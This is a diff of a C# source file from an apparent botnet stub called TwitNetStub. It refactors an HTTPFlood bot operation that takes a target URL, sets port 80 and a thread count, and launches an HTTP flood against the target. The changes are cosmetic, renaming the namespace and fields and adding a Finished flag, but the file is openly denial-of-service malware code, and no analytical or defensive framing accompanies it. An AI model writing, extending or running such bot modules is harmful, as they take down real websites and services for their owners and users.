@@ -1,12 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Text;
 using TwitNetStub.Util.Network;
 
-namespace TwitNetStub.Commands
+namespace TwitNetStub.Operations
 {
     class HTTPFlood : IBotOperation
     {
+        public bool Finished { get; set; }
         private string MainURL;
         private int Port;
         private int Threads;
@@ -15,6 +14,7 @@ namespace TwitNetStub.Commands
         {
             MainURL = url;
         }
+
         public void Initialize()
         {
            Port = 80;
@@ -22,10 +22,11 @@ namespace TwitNetStub.Commands
         }
         public void Run()
         {
-            HTTP.sFHost = MainURL;
+            HTTP.SfHost = MainURL;
             HTTP.Port = Port;
-            HTTP.iThreads = Threads;
+            HTTP.Threads = Threads;
             HTTP.StartHTTPFlood();
+            //Finished = true;
         }
     }
 }
